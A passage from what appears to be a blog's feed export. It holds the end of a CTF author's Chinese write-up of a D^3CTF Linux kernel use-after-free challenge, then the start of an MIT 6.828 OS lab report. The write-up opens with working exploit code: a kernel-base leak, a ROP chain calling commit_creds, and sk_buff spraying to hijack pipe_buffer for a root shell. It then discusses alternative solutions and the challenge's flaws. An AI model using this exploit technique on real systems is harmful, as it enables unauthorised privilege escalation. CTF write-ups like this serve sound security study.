&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;</span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// for gdb attach only</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可完成提权，成功率比笔者最初拍脑门想的解法要高得多XD</p><p><img src="https://s2.loli.net/2022/05/17/vZhdoFP5TgRc9Ul.png" alt="image.png"></p><h1 id="0x03-其他的预期解"><a href="#0x03-其他的预期解" class="headerlink" title="0x03.其他的预期解"></a>0x03.其他的预期解</h1><p>除了笔者的官方解法以外，笔者认为以下方法应当也能解开本题（笔者未进行尝试）：</p><ul><li>由于整个文件系统是直接在内存中的，因此可以直接搜索内存寻找 flag（笔者本人并不推荐这种专注于 flag 本身的解法）</li><li>直接分配其他可以劫持 RIP 的结构体，然后爆破内核 .text 段偏移，在 pt_regs 上构造 ROP</li><li>slub 大师通过巧妙构造泄露出 cookie 与堆上地址，然后劫持 freelist（笔者有思路但笔者认为这种解法过于麻烦 + 没有必要）<ul><li>泄露出内核基址后后写一些全局指针（例如 <code>n_tty_ops</code>）</li><li>利用 prctl 修改 current_task 的 comm 成员，暴力搜索内存找到 cred</li></ul></li><li>将 double free 应用到其他的结构体上，使其转换为一个已知的 CVE 后直接打</li><li>利用 0day 或是（笔者不知道的） 1day 直接打 kernel</li></ul><h1 id="0x04-解题情况与非预期"><a href="#0x04-解题情况与非预期" class="headerlink" title="0x04.解题情况与非预期"></a>0x04.解题情况与非预期</h1><p>这一次的 D^3CTF 中笔者的题是第二批放出的，但在笔者放出题目后不久便被 W&amp;M 战队拿下了一血，而整个比赛中解出了这道题目的队伍也达到了 8 支之多，笔者原以为是自身出题水准不足以至于出的题目只有签到题水平于是被各大战队秒杀（虽然笔者本身就很菜），但事情往往没有笔者所想的那么简单</p><p>在比赛结束时，我们发放了一份调查问卷，而笔者在其中看到了一条对笔者题目的评价——</p><p><img src="https://s2.loli.net/2022/03/08/64O12YCIPXuj35t.png" alt="image.png"></p><p>笔者在看到这条消息之后整个大脑一片空白，马上从比赛平台上下载下来题目附件，解压，果然在 <code>/tmp</code> 目录下看到了一个熟悉的 <code>exp</code> 文件…</p><p><img src="https://s2.loli.net/2022/03/08/gartTlFBis2xALv.png" alt="image.png"></p><p>赛后笔者查阅选手们的 wp，<strong>确乎是有一半的队伍利用笔者留下来的 exp 解出了这道题</strong>，这也令这道题的做题体验大打折扣，在这里笔者向大家献上最诚挚的歉意🙇🏽‍♂️🙇🏽‍♂️🙇🏽‍♂️！！！</p><p>不过比较幸运的一点是笔者本地测试时是直接在根目录下测试的，因此 setxattr 的第一个参数是 <code>/exp</code>，而对于远程环境而言根目录对选手是不可写的，选手的 exp 路径应当为 <code>/tmp/exp</code>，这也让这个 exp 无法被直接打通（否则可能解题队伍数量还得翻个数十倍…），不过选手仍可以逆向出 exp 逻辑后进行修改</p><p>wp 中只有四支队伍是正常做题的，解法基本上都是预期解——使用 <code>msg_msg</code> 泄露信息与 <code>pipe_buffer</code> 劫持 RIP，不过都比笔者这个笨拙的解法要优秀上许多（笑），基本上可以归为两种题解：</p><ul><li>喷射 pipe_buffer 与 sk_buff，参照 CVE-2021-22555 的解法完成解题（3支队伍）</li><li>喷射大量 pipe_buffer 后直接用 setxattr 修改 msg_msg 越界读泄露出 kernel base，修改 msg_msg-&gt;next 到 <code>vmemmap_base</code> 前 8 字节（刚好为 NULL），这个地方存放了几个全局变量（指向 <code>vmemmap_base</code>、<code>vmalloc_base</code>、<code>page_offset_base</code> 的指针等都在这里），读出“堆基址”后用一个堆上地址修复 msg_msg 的 header，然后劫持 pipe_buffer。这个解法和笔者的解法基本上是一样的</li></ul><p>笔者在出题过程中其实也看到了 CVE-2021-22555，这个漏洞本身是一个 off-by-null，最后转化为一个 UAF 进行利用，因此与笔者的这道题最终是可以殊途同归的，事实证明正常解题的队伍基本上都参照了这个漏洞（笑），不过笔者还是希望能够探索出一条别的道路，所以你在上面看到的笔者的解法其实与这个漏洞的利用过程并非是完全一样的</p><blockquote><p>外国友人对本题的评价：</p><blockquote><p>This is a standard kernel pwn challenge. We are given an unprivileged shell in a Linux VM, and the flag can only be read by root. The VM loads a vulnerable kernel module, which we have to exploit to gain root privileges and read the flag.</p></blockquote><p>说实话这一次出题确实还是比较常规，希望笔者明年能够想到一些更好的东西XD</p></blockquote><h1 id="0x05-总结与反思"><a href="#0x05-总结与反思" class="headerlink" title="0x05.总结与反思"></a>0x05.总结与反思</h1><p>虽然在官方解法中使用了“看似非常通用的解法”解出了这道题，但笔者其实是不太满意的：</p><ul><li>该方法仅适用于较大的 object，对于小一点的 object 或者 kmem_cache-&gt;offset 为 0 的情况则<strong>很容易让我们无法修复 msg_msg，甚至就无法分配 msg_msg</strong> （小于 0x30 的情况）</li><li>在劫持 RIP 的过程当中<strong>仍然需要根据 object 大小去找对应的可用结构体</strong>，而没有一个更加<strong>通用</strong>的劫持控制流的办法，这无疑造成了相当程度的限制</li><li>对于独立的 kmem_cache 而言<strong>无法使用该方法进行利用</strong>，因为此时 msg_msg 不从该处分配</li><li><strong>真实环境中在进行内存分配的并非只有我们</strong>，很容易被其他进程拿到 freelist 造成 kernel panic</li><li>这个方法似乎并不能在泛 Linux 平台上通用（据悉 Android 并不能使用这一套 IPC API，笔者尚未查证）</li></ul><p>因此笔者认为这道题目充其量能在 D3CTF 这一档次的比赛中充当签到题，但笔者还是希望笔者对“通解”的探索能够给大家带来一些新的思考（笑）</p><p>在出题过程当中还遇到了这样的问题，原因暂且不明，也希望了解其细节的大师傅不吝赐教：</p><ul><li>笔者惯用的手法是利用 <code>pt_regs</code> 结构体构造 ROP，控制栈迁移到此处，但是在本题中<strong>每次劫持 RIP 时内核栈顶到栈底的相对偏移都并非一固定值</strong>，因此笔者只好用传统的堆上 ROP 方式，笔者暂且不清楚是什么原因造成了<strong>偏移值不固定</strong>的情况的出现</li><li>对于 5.14 及往上版本的内核，<strong>setxattr 与 msgsnd 不会从同一张 slub 上取 object</strong>（一个是 <code>GFP_KERNEL_ACCOUNT</code> 而另一个是 <code>GPF_KERNEL</code>，但这两个 flag 在之前的版本中似乎并不会造成 slub 的隔离），但笔者尚未发现 5.14 内核中 slub 涉及的源码的相关改动（笔者仅粗略检索了源码）</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;听说 sb 出题人把 exp 也给打包发布了，比赛结束才发现&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="Use After Free" scheme="http://blog.arttnba3.cn/tags/Use-After-Free/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Kernel UAF" scheme="http://blog.arttnba3.cn/tags/Kernel-UAF/"/>
    
    <category term="D^3CTF" scheme="http://blog.arttnba3.cn/tags/D-3CTF/"/>
    
  </entry>
  
  <entry>
    <title>【EXPR.0x00】MIT 6.828 课程实验报告</title>
    <link href="http://blog.arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/"/>
    <id>http://blog.arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/</id>
    <published>2022-02-20T18:57:25.000Z</published>
    <updated>2022-07-03T19:11:02.366Z</updated>
    
    <content type="html"><![CDATA[<p>不如 Windows XP 好用</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote><p>为什么要写这篇博客？参见 <a href="https://arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/">https://arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH&#x2F;</a></p></blockquote><p>MIT 6.828 是十分著名的一个综合性的操作系统实验课程，由麻省理工大学（MIT）开设，一共有 6 个 lab，基于 XV6——一个为OS课程教学而开发的 OS kernel，手把手带你一步步补全一个操作系统内核。笔者认为这是十分优秀且富有完成价值的一个 OS 实验，因此笔者决定趁大三寒假实习的空闲时间将本课程补完。</p><p>笔者选用其 2018 年的实验课程，因为自从 2019 起他们转向了 RISC-V，而笔者暂时不想离开 X86 的舒适区（笑），因为本次实验的主要目的还是学习操作系统，笔者不想在学习其他架构上花费太多时间</p><h2 id="PRE-环境搭建"><a href="#PRE-环境搭建" class="headerlink" title="PRE.环境搭建"></a>PRE.环境搭建</h2><blockquote><p>参见 <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html">https://pdos.csail.mit.edu/6.828/2018/tools.html</a></p><h1 id="Tools-Used-in-6-828"><a href="#Tools-Used-in-6-828" class="headerlink" title="Tools Used in 6.828"></a>Tools Used in 6.828</h1><p>You’ll use two sets of tools in this class: an x86 emulator, <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html#qemu">QEMU</a>, for running your kernel; and a <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html#chain">compiler toolchain</a>, including assembler, linker, C compiler, and debugger, for compiling and testing your kernel. This page has the information you’ll need to download and install your own copies. This class assumes familiarity with Unix commands throughout.</p><p>We highly recommend using a Debathena machine, such as athena.dialup.mit.edu, to work on the labs. If you use the MIT Athena machines that run Linux, then all the software tools you will need for this course are located in the 6.828 locker: just type ‘add -f 6.828’ to get access to them.</p><p>If you don’t have access to a Debathena machine, we recommend you use a virtual machine with Linux. If you really want to, you can build and install the tools on your own machine. We have instructions below for Linux and MacOS computers.</p><p>It should be possible to get this development environment running under windows with the help of <a href="http://www.cygwin.com/">Cygwin</a>. Install cygwin, and be sure to install the flex and bison packages (they are under the development header).</p><p>For an overview of useful commands in the tools used in 6.828, see the <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html">lab tools guide</a>.</p></blockquote><p>为了开始本次实验，我们主要需要这两样东西：</p><ul><li><p>一个 x86 模拟器：QEMU——用以运行内核</p></li><li><p>一套编译工具，包括汇编器、链接器、C 编译器、调试器——用以编译与测试内核</p></li></ul><h3 id="Compiler-Toolchain"><a href="#Compiler-Toolchain" class="headerlink" title="Compiler Toolchain"></a>Compiler Toolchain</h3><p>为了完成本次实验，笔者用了一个近乎全新的 Ubuntu 21.10，按课程页面进行如下操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y build-essential gdb</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-multilib</span></span><br></pre></td></tr></table></figure><p>检查，出现类似下面的输出说明安装成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -m32 -print-libgcc-file-name</span></span><br><span class="line">/usr/lib/gcc/x86_64-linux-gnu/8/32/libgcc.a</span><br></pre></td></tr></table></figure><h3 id="QEMU-Emulator"><a href="#QEMU-Emulator" class="headerlink" title="QEMU Emulator"></a>QEMU Emulator</h3><p>为了更好地进行实验，MIT 6.828 课程的教师们将 qemu 进行了一定的改造，因此我们需要手动编译安装 patch 后的 QEMU</p><p>首先补充安装一些库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install libsdl1.2-dev libtool-bin libglib2.0-dev libz-dev libpixman-1-dev</span></span><br></pre></td></tr></table></figure><p>从 GitHub 拉源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/mit-pdos/6.828-qemu.git qemu</span></span><br></pre></td></tr></table></figure><p>在源码目录下进行需要的配置，<code>[]</code> 里的是可选项（输入命令时不带这个框）</p><ul><li><p><code>--prefix=PFX</code>：指定安装 qemu 的目录，若未指定则默认为 <code>/usr/local</code></p></li><li><p><code>--target-list=&quot;i386-softmmu x86_64-softmmu</code>：精简化要安装的架构</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure --disable-kvm --disable-werror [--prefix=PFX] [--target-list=<span class="string">&quot;i386-softmmu x86_64-softmmu&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>最后编译就完事了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo make install</span></span><br></pre></td></tr></table></figure><blockquote><h3 id="可能出现的错误"><a href="#可能出现的错误" class="headerlink" title="可能出现的错误"></a>可能出现的错误</h3><p>笔者在编译 qemu 时遇到了这样的错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  CC    stubs/qmp_pc_dimm_device_list.o</span><br><span class="line">  AR    libqemustub.a</span><br><span class="line">  LINK  qemu-ga</span><br><span class="line">/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor&#x27;:</span><br><span class="line">/home/arttnba3/Desktop/MIT_6.828/qqemu/qga/commands-posix.c:633: undefined reference to `major&#x27;</span><br><span class="line">/usr/bin/ld: /home/arttnba3/Desktop/MIT_6.828/qqemu/qga/commands-posix.c:634: undefined reference to `minor&#x27;</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br><span class="line">make: *** [Makefile:288: qemu-ga] Error 1</span><br></pre></td></tr></table></figure><p>参照 <a href="http://patchwork.ozlabs.org/patch/709415/">[v3] build: include sys&#x2F;sysmacros.h for major() and minor() - Patchwork</a> ，在 qemu 源码目录下的 <code>qga/commands-posix.c</code> 加上一个 <code>#include &lt;sys/sysmacros.h&gt;</code></p><p>继续 make install，之后还可能出现这样一个错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  Building optionrom/kvmvapic.img</span><br><span class="line">  Building optionrom/kvmvapic.raw</span><br><span class="line">  Signing optionrom/kvmvapic.bin</span><br><span class="line">install -d -m 0755 &quot;/usr/local/share/qemu&quot;</span><br><span class="line">install: cannot change permissions of ‘/usr/local/share/qemu’: No such file or directory</span><br><span class="line">make: *** [Makefile:382: install-datadir] Error 1</span><br></pre></td></tr></table></figure><p>我们手动创建 <code>/usr/local/share/qemu</code> 这个目录即可</p><p>之后继续 make install，又报缺一个目录的错误（不能一次报完嘛 - - ）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">install -d -m 0755 &quot;/usr/local/share/qemu&quot;</span><br><span class="line">install -d -m 0755 &quot;/usr/local/etc/qemu&quot;</span><br><span class="line">install: cannot change permissions of ‘/usr/local/etc/qemu’: No such file or directory</span><br><span class="line">make: *** [Makefile:392: install-confdir] Error 1</span><br></pre></td></tr></table></figure><p>依旧手动创建之，然后 make install，这里需要注意我们应当以 root 权限执行</p></blockquote><h1 id="0x01-Lab-1-Booting-a-PC"><a href="#0x01-Lab-1-Booting-a-PC" class="headerlink" title="0x01.Lab 1: Booting a PC"></a>0x01.Lab 1: Booting a PC</h1><blockquote><p>lab 页面： <a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/%5D">[https://pdos.csail.mit.edu/6.828/2018/labs/lab1/]</a>(<a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/">Lab 1: PC Bootstrap and GCC Calling Conventions</a>)</p></blockquote><blockquote><p>该 lab 大量内容与 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">【CODE.0x00】从零开始的32位操作系统开发手记 - arttnba3’s blog</a>重复，<strong>相关知识笔者于本篇博客中仅做简述，不再重复摘抄，如有需要请自行阅读笔者的这篇博客</strong></p></blockquote><p>该 lab 总共三个部分：</p><ul><li><p>熟悉 x86 汇编语言、QEMU x86 模拟器、PC的开机引导流程</p></li><li><p>测试我们用于引导内核的 boot loader（xv6源码下 <code>boot</code> 目录）</p></li><li><p>深入研究 6.828 内核的初始模板（JOS）</p></li></ul><p>在开始实验之前我们首先把 xv6 源码拉到本地：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://pdos.csail.mit.edu/6.828/2018/jos.git lab</span></span><br></pre></td></tr></table></figure><p>对于 MIT 的学生来说需要将实验过程 <code>make handin</code> 之后提交到对应的仓库，不过笔者只是大洋彼岸旁听的（笑）所以这一步就跳过了</p><h2 id="Part-1-PC-Bootstrap"><a href="#Part-1-PC-Bootstrap" class="headerlink" title="Part 1: PC Bootstrap"></a>Part 1: PC Bootstrap</h2><p>这一部分的主要目的是让学生熟悉<strong>一个计算机是如何启动的</strong>，通电——载入 BIOS——BIOS载入 MBR——跳转到 MBR——（载入 loader）——载入内核</p><blockquote><p>参见笔者的<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">这篇博客</a></p></blockquote><h3 id="Getting-Started-with-x86-assembly"><a href="#Getting-Started-with-x86-assembly" class="headerlink" title="Getting Started with x86 assembly"></a>Getting Started with x86 assembly</h3><p>MIT 为那些不熟悉 x86 汇编语言的人准备了 <a href="https://pdos.csail.mit.edu/6.828/2018/readings/pcasm-book.pdf">PC Assembly Language Book</a>，接下来我们来看 Exercise1：</p><blockquote><p>Exercise 1. Familiarize yourself with the assembly language materials available on <a href="https://pdos.csail.mit.edu/6.828/2018/reference.html">the 6.828 reference page</a>. You don’t have to read them now, but you’ll almost certainly want to refer to some of this material when reading and writing x86 assembly.</p><p>We do recommend reading the section “The Syntax” in <a href="http://www.delorie.com/djgpp/doc/brennan/brennan_att_inline_djgpp.html">Brennan’s Guide to Inline Assembly</a>. It gives a good (and quite brief) description of the AT&amp;T assembly syntax we’ll be using with the GNU assembler in JOS.</p></blockquote><p>这一部分主要就是熟悉 x86 汇编语言，笔者在高中的时候就已经会了故这里直接跳过（笑），不过其推荐的材料还是值得一读的。</p><p>比较令笔者不适的是实验中涉及到的汇编代码都是丑陋的 AT&amp;T 语法而并非优美的 x86 语法（恼）</p><h3 id="Simulating-the-x86"><a href="#Simulating-the-x86" class="headerlink" title="Simulating the x86"></a>Simulating the x86</h3><p>这一步我们开始编译 JOS（xv6）并尝试使用 qemu 运行，在刚刚 clone 下来的源码目录下进行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line">+ as kern/entry.S</span><br><span class="line">+ cc kern/entrypgdir.c</span><br><span class="line">+ cc kern/init.c</span><br><span class="line">+ cc kern/console.c</span><br><span class="line">+ cc kern/monitor.c</span><br><span class="line">+ cc kern/printf.c</span><br><span class="line">+ cc kern/kdebug.c</span><br><span class="line">+ cc lib/printfmt.c</span><br><span class="line">+ cc lib/readline.c</span><br><span class="line">+ cc lib/string.c</span><br><span class="line">+ ld obj/kern/kernel</span><br><span class="line">ld: warning: section `.bss&#x27; type changed to PROGBITS</span><br><span class="line">+ as boot/boot.S</span><br><span class="line">+ cc -Os boot/main.c</span><br><span class="line">+ ld boot/boot</span><br><span class="line">boot block is 412 bytes (max 510)</span><br><span class="line">+ mk obj/kern/kernel.img</span><br></pre></td></tr></table></figure><p>其会生成一个磁盘镜像文件</p><p>接下来启动 qemu，MIT 在其提供的 Makefile 文件中写好了启动的代码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make qemu</span></span><br></pre></td></tr></table></figure><p>启动界面如下，这两个界面都可以进行输入，还是十分方便的：</p><p><img src="https://s2.loli.net/2022/02/20/FCqAQm85o3OUzKH.png" alt="imagepng"></p><p>在最初时 JOS 只提供了两个命令：<code>help</code> 和 <code>kerninfo</code>，<strong>补完剩下的功能让其成为一个完整的内核便是我们在后面几个 lab 中要做的事情</strong> <img src="https://s2.loli.net/2022/02/20/RmXtkdYnL7HGCK5.png" alt="imagepng"></p><h3 id="The-PC’s-Physical-Address-Space"><a href="#The-PC’s-Physical-Address-Space" class="headerlink" title="The PC’s Physical Address Space"></a>The PC’s Physical Address Space</h3><p>一台 PC 的物理地址通常遵循如下布局（32位下）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">+------------------+  &lt;- 0xFFFFFFFF (4GB)</span><br><span class="line">|      32-bit      |</span><br><span class="line">|  memory mapped   |</span><br><span class="line">|     devices      |</span><br><span class="line">|                  |</span><br><span class="line">/\/\/\/\/\/\/\/\/\/\</span><br><span class="line"></span><br><span class="line">/\/\/\/\/\/\/\/\/\/\</span><br><span class="line">|                  |</span><br><span class="line">|      Unused      |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- depends on amount of RAM</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">| Extended Memory  |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- 0x00100000 (1MB)</span><br><span class="line">|     BIOS ROM     |</span><br><span class="line">+------------------+  &lt;- 0x000F0000 (960KB)</span><br><span class="line">|  16-bit devices, |</span><br><span class="line">|  expansion ROMs  |</span><br><span class="line">+------------------+  &lt;- 0x000C0000 (768KB)</span><br><span class="line">|   VGA Display    |</span><br><span class="line">+------------------+  &lt;- 0x000A0000 (640KB)</span><br><span class="line">|                  |</span><br><span class="line">|    Low Memory    |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- 0x00000000</span><br></pre></td></tr></table></figure><blockquote><p>关于前面这 1MB 的具体内存布局，可以参见 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%80%E3%80%81%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80">【CODE.0x00】从零开始的32位操作系统开发手记 - arttnba3’s blog</a></p></blockquote><h3 id="The-ROM-BIOS"><a href="#The-ROM-BIOS" class="headerlink" title="The ROM BIOS"></a>The ROM BIOS</h3><p>在这部分实验中我们将使用 gdb 来调试 qemu，MIT 同样在 Makefile 中编写好了相应的命令行，我们只需要在第一个终端界面中执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make qemu-gdb</span></span><br></pre></td></tr></table></figure><p>其会启动一个等待 gdb 连接 的qemu</p><p><img src="https://s2.loli.net/2022/02/20/rdO63wCxPUovYsN.png" alt="imagepng"></p><p>接下来在第二个终端中执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make gdb</span></span><br></pre></td></tr></table></figure><p>其会启动 gdb 并自动连接上 qemu，这里我们可以看到 <code>CS:IP</code> 为 <code>0xf000:0xfff0</code>，即此时执行的代码地址为 <code>0xffff0</code> ，其实就是 <strong>BIOS 